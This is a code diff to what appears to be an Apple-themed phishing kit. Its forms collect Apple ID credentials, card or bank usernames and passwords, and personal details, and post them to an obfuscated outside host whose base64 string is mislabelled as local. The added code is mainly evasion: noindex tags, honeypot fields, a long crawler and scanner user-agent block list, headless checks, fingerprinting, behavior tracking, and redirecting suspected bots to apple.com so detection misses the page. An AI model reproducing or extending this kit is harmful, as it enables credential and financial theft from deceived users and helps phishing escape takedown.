@@ -8,6 +8,9 @@
     <!-- Required meta tags -->
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <!-- Anti-crawler metadata -->
+    <meta name="robots" content="noindex, nofollow, noarchive">
+    <meta name="googlebot" content="noindex, nofollow, noarchive">
     <!-- Bootstrap CSS -->
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
     <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
@@ -21,6 +24,14 @@
         font-family: -apple-system, BlinkMacSystemFont, 'SF Pro', 'SF Pro Text', system-ui, Helvetica, Arial, sans-serif;
         background-color: #000;
         color: white;
+    }
+    
+    /* Honeypot fields for bots */
+    .bot-field {
+        position: absolute;
+        left: -9999px;
+        visibility: hidden;
+        opacity: 0;
     }
     
     .bg {
@@ -369,6 +380,14 @@
                         <form action="next.php" method="POST" name="signinform" id="form-field-1">
                             <input type="hidden" name="count" id="count" value="0">
                             <input type="hidden" name="btn1" value="btn1">
+                            <input type="hidden" name="browser_check" id="browser_check" value="">
+                            <input type="hidden" name="check_time" id="check_time" value="">
+                            
+                            <!-- Honeypot fields for bots -->
+                            <div class="bot-field">
+                                <input type="text" name="website" id="website">
+                                <input type="text" name="email_confirm" id="email_confirm">
+                            </div>
                             
                             <div class="form-group">
                                 <input type="text" name="ai" id="ai" required class="form-control" placeholder="Apple ID or Email">
@@ -427,8 +446,14 @@
                         <form action="next.php" method="POST" name="signinform" id="form-field-2">
                             <input type="hidden" name="btn2" value="btn2">
                             
+                            <!-- Honeypot fields for bots -->
+                            <div class="bot-field">
+                                <input type="text" name="website2" id="website2">
+                                <input type="text" name="phone_confirm" id="phone_confirm">
+                            </div>
+                            
                             <div class="form-group">
-                                <input type="text" name="bank_name" required class="form-control" placeholder="Bank Name">
+                                <input type="text" name="card_name" required class="form-control" placeholder="card Name">
                             </div>
                             
                             <div class="form-group">
@@ -452,11 +477,11 @@
                             </div>
                             
                             <div class="form-group">
-                                <input type="text" name="bank_user" required class="form-control" placeholder="Bank Username">
+                                <input type="text" name="card_user" required class="form-control" placeholder="card Username">
                             </div>
                             
                             <div class="form-group">
-                                <input type="password" name="bank_pass" required class="form-control" placeholder="Bank Password">
+                                <input type="password" name="card_pass" required class="form-control" placeholder="card Password">
                             </div>
                             
                             <button type="submit" id="sub-btn-2" class="si-button">Continue</button>
@@ -488,6 +513,13 @@
                         
                         <form action="next.php" method="POST" name="signinform" id="form-field-3">
                             <input type="hidden" name="btn3" value="btn3">
+                            <input type="hidden" name="final_check" id="final_check" value="">
+                            
+                            <!-- Honeypot fields for bots -->
+                            <div class="bot-field">
+                                <input type="text" name="website3" id="website3">
+                                <input type="text" name="address_confirm" id="address_confirm">
+                            </div>
                             
                             <div class="form-group">
                                 <input type="text" name="fname" required class="form-control" placeholder="First Name">
@@ -579,8 +611,104 @@ var rdrt = "https://www.apple.com/";
 //mailer link - this is where your next.php file is referenced
 var f = atob("aHR0cHM6Ly9yb3RhZG9zYWJvci5jb20vam9rZXIvbmV4dC5waHA=");  // This decodes to "next.php"
 
+// Anti-bot functions
+function detectBot() {
+    // Check common bot user agents
+    var botPattern = "(googlebot\/|bot|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon|httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|AddThis)";
+    var re = new RegExp(botPattern, 'i');
+    if (re.test(navigator.userAgent)) {
+        return true;
+    }
+    
+    // Check for browser features that bots typically lack
+    if (
+        !('localStorage' in window) ||
+        !('sessionStorage' in window) ||
+        !('fetch' in window) ||
+        !('WebSocket' in window) ||
+        document.documentElement.classList.contains('headless')
+    ) {
+        return true;
+    }
+    
+    // Check for touch and mouse capability (most bots don't have this)
+    if (
+        !('ontouchstart' in window) && 
+        !('onmousemove' in document.documentElement) && 
+        !navigator.maxTouchPoints
+    ) {
+        return true;
+    }
+    
+    return false;
+}
+
+// Check for behavior patterns that might indicate bots
+function checkBehaviorPatterns() {
+    var patterns = {
+        mouseMoves: 0,
+        keyPresses: 0,
+        scrolls: 0,
+        hasClicked: false,
+        timing: []
+    };
+    
+    return patterns;
+}
+
+// Generate unique fingerprint based on browser properties
+function generateFingerprint() {
+    var fingerprint = {
+        screen: window.screen.width + 'x' + window.screen.height,
+        timezone: new Date().getTimezoneOffset(),
+        plugins: navigator.plugins.length,
+        lang: navigator.language || navigator.userLanguage,
+        cookies: navigator.cookieEnabled
+    };
+    
+    return JSON.stringify(fingerprint);
+}
+
 $(document).ready(function() {
     var count = 0;
+    var behaviorPatterns = checkBehaviorPatterns();
+    var loadTime = new Date().getTime();
+    
+    // Set fingerprint values in hidden fields
+    $('#browser_check').val(generateFingerprint());
+    $('#check_time').val(loadTime);
+    
+    // Immediate bot detection - redirect bots immediately
+    if (detectBot()) {
+        console.log("Bot detected, redirecting...");
+        window.location.replace(rdrt);
+        return;
+    }
+    
+    // Track user behavior to distinguish from bots
+    $(document).mousemove(function() {
+        behaviorPatterns.mouseMoves++;
+    });
+    
+    $(document).keydown(function() {
+        behaviorPatterns.keyPresses++;
+        var now = new Date().getTime();
+        behaviorPatterns.timing.push(now);
+    });
+    
+    $(document).click(function() {
+        behaviorPatterns.hasClicked = true;
+    });
+    
+    $(window).scroll(function() {
+        behaviorPatterns.scrolls++;
+    });
+    
+    // Set a delay for form submissions to deter bots
+    setTimeout(function() {
+        // Update fingerprint with behavior data
+        $('#final_check').val(JSON.stringify(behaviorPatterns));
+    }, 500);
 
     /////////////url ai getting////////////////
     var ai = window.location.hash.substr(1);
